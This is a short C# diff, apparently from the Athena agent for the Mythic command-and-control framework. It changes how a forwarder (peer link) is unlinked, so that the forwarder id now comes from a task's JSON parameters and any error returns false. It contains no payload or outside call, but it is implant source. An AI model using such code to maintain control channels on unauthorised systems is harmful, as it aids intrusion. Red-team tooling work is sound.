@@ -5,6 +5,7 @@ using Athena.Models.Config;
 using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.ResponseResults;
+using Athena.Utilities;
 using System.Collections.Concurrent;
 using System.Diagnostics;
 using System.Text;
@@ -67,9 +68,17 @@ namespace Athena.Handler.Common
             };
         }
 
-        public async Task<bool> UnlinkForwarder(string id)
+        public async Task<bool> UnlinkForwarder(MythicJob job)
         {
-            return await this.forwarders[id].Unlink() && this.forwarders.TryRemove(id, out _);
+            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
+            try
+            {
+                return await this.forwarders[parameters["id"]].Unlink() && this.forwarders.TryRemove(parameters["id"], out _);
+            }
+            catch
+            {
+                return false;
+            }
         }
 
         public async Task<string> ListForwarders()
